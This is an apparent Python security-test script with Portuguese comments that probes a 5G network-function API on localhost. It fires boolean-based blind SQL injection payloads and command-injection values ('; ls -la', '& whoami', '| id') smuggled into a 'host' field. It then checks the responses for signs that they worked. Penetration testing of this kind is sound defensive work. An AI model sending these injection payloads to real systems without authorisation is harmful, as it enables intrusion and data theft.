import requests
import urllib3
import json
import time

#Desabilitar avisos de certificados autoassinados para ambientes de teste
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Configurações do teste
NF_API_URL = "https://127.0.0.1:29503/api/profile" #Exemplo de URL de API da NF (substituir)
TARGET_PARAMETER = "id"
HEADERS = {"Content-Type": "application/json"}
TEST_SUPI = "imsi-208930000000001"

print("[+] Testando SQL Injection (Boolean-based blind)...")

#Payload de controle (requisição válido)
payload_control = {TARGET_PARAMETER: f"'{TEST_SUPI}'"}

#Payload verdadeiro (' OR 1=1)
payload_true = {TARGET_PARAMETER: f"'{TEST_SUPI}' OR 1=1 --"}

#Payload falso (' OR 1=2)
payload_false = {TARGET_PARAMETER: f"'{TEST_SUPI}' OR 1=2 --"}

try:
    response_control = requests.post(NF_API_URL, headers=HEADERS, data=json.dumps(payload_control), verify=False)
    len_control = len(response_control.text)

    response_true = requests.post(NF_API_URL, headers=HEADERS, data=json.dumps(payload_true), verify=False)
    len_true = len(response_true.text)

    response_false = requests.post(NF_API_URL, headers=HEADERS, data=json.dumps(payload_false), verify=False)
    len_false = len(response_false.text)

    if len_true > len_control and len_false == len_control:
        print("[!!!] SQL Injection (Boolean-based) detectada! A API é vulnerável")

    else:
        print("[-] SQL Injection (Boolean-based) não detectada. As respostas são iguais.")

except requests.exceptions.RequestException as e:
    print(f"[-] Erro ao se conectar à API: {e}")

#--Teste de Command Injection ---
NF_MGMT_URL = "https://127.0.0.1:8000/management/ping" #Exemplo de API de gerenciamento
TARGET_CMD_PARAM = "host"
injection_commands = ["; ls -la", "& whoami", "| id"]

print("\n[+] Testando Command Injection...")

for command in injection_commands:
    payload = {TARGET_CMD_PARAM: f"127.0.0.1{command}"}
    print(f"[*] Enviando payload: {payload}")
    try:
        response = requests.post(NF_MGMT_URL, headers={"Content-Type": "application/json"}, data=json.dumps(payload), verify=False)
        if "total" in response.text or "uid=" in response.text or "root" in response.text:
            print(f"[!!!] Command Injection detectada! Payload '{command}' funcionou")
            print(f"[*] Resposta da API: {response.text[:200]}...")
            break

        else:
            print(f"[-] Comando '{command}' não parece ser executado.")

    except requests.exceptions.RequestException as e:
        print(f"[-] Erro de conexão ao testar o comando '{command}': {e}")